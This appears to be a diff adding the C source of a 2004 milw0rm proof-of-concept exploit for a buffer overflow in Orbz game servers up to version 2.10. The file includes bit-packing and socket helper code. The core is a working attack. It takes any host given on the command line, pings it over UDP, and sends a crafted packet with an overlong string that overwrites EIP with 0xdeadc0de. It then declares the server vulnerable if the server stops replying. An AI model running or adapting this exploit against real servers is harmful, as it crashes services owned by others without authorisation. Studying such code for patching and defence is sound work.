@@ -1,0 +1,330 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+/*
+
+Read/Write bits to buffer 0.1.1
+by Luigi Auriemma
+e-mail: aluigi@altervista.org
+web:    http://aluigi.altervista.org
+
+max 32 bits numbers supported (from 0 to 4294967295).
+Probably not the fastest bit packing functions existent, but I like them.
+
+*/
+
+
+
+unsigned long read_bits(    // number read
+  unsigned long bits,       // how much bits to read
+  unsigned char *in,        // buffer from which to read the number
+  unsigned long in_bits     // position of the buffer in bits
+) {
+    unsigned long   seek_bits,
+                    rem,
+                    seek = 0,
+                    ret  = 0,
+                    mask = -1L;
+
+    if(bits > 32) return(0);
+    if(bits < 32) mask = (1 << bits) - 1;
+    for(;;) {
+        seek_bits = in_bits & 7;
+        ret |= ((*(in + (in_bits >> 3)) >> seek_bits) & mask) << seek;
+        rem = 8 - seek_bits;
+        if(rem >= bits) break;
+        bits    -= rem;
+        in_bits += rem;
+        seek    += rem;
+        mask    = (1 << bits) - 1;
+    }
+    return(ret);
+}
+
+
+
+unsigned long write_bits(   // position where the stored number finishs
+  unsigned long data,       // number to store
+  unsigned long bits,       // how much bits to occupy
+  unsigned char *out,       // buffer on which to store the number
+  unsigned long out_bits    // position of the buffer in bits
+) {
+    unsigned long   seek_bits,
+                    rem;
+
+    if(bits > 32) return(out_bits);
+    if(bits < 32) data &= ((1 << bits) - 1);
+    for(;;) {
+        seek_bits = out_bits & 7;
+        *(out + (out_bits >> 3)) &= (1 << seek_bits) - 1;   // zero
+        *(out + (out_bits >> 3)) |= (data << seek_bits);
+        rem = 8 - seek_bits;
+        if(rem >= bits) break;
+        out_bits += rem;
+        bits     -= rem;
+        data     >>= rem;
+    }
+    return(out_bits + bits);
+}
+
+
+
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+
+
+    #define close   closesocket
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+#endif
+
+
+
+#define VER     "0.1"
+#define PORT    28000
+#define BUFFSZ  2048
+#define TIMEOUT 3
+#define EIP     "\xde\xc0\xad\xde"
+#define BOF     "aaaaaaaaaaaaaaaaaaaa" \
+                EIP \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaa" \
+                /* max 255 */
+
+
+
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    u_long  bits;
+    int     sd,
+            i,
+            len;
+    u_short port = PORT;
+    u_char  buff[BUFFSZ];
+    struct  sockaddr_in peer;
+
+
+    srand(time(NULL));
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Orbz <= 2.10 buffer-overflow "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <host> [port(%d)]\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    if(argc > 2) port = atoi(argv[2]);
+
+    peer.sin_addr.s_addr = resolv(argv[1]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr),
+        port);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    fputs("- ping server: ", stdout);
+    if(sendto(sd, "\x1a", 1, 0, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+
+    if(timeout(sd) < 0) {
+        fputs("\n"
+            "Error: no reply received, probably the server is not online\n"
+            "\n", stdout);
+        exit(1);
+    }
+    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
+    if(len < 0) std_err();
+
+    if(*buff != 0x1c) {
+        fputs("bad reply, however I continue\n", stdout);
+    } else {
+        fputs("ok\n", stdout);
+    }
+
+    memset(buff, 0x00, BUFFSZ);  /* not needed */
+    bits = write_bits(0x1a, 8, buff, 0);
+    bits = write_bits(9, 32, buff, bits);
+    bits = write_bits(0xffffffff, 32, buff, bits);
+    bits = write_bits(rand(), 32, buff, bits);
+    bits++;
+    bits = write_bits(sizeof(BOF) - 1, 8, buff, bits);
+    for(i = 0; i < (sizeof(BOF) - 1); i++) {
+        bits = write_bits(BOF[i], 8, buff, bits);
+    }
+    len = bits >> 3;
+    if(bits & 7) len++;
+
+    printf("- send BOOM packet, EIP = 0x%08lx\n", *(u_long *)EIP);
+    if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+
+    if(timeout(sd) < 0) {
+        fputs("\nServer IS vulnerable!!!\n\n", stdout);
+    } else {
+        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct  hostent *hp;
+    u_long  host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolve hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+
+
+
+// milw0rm.com [2004-11-29]
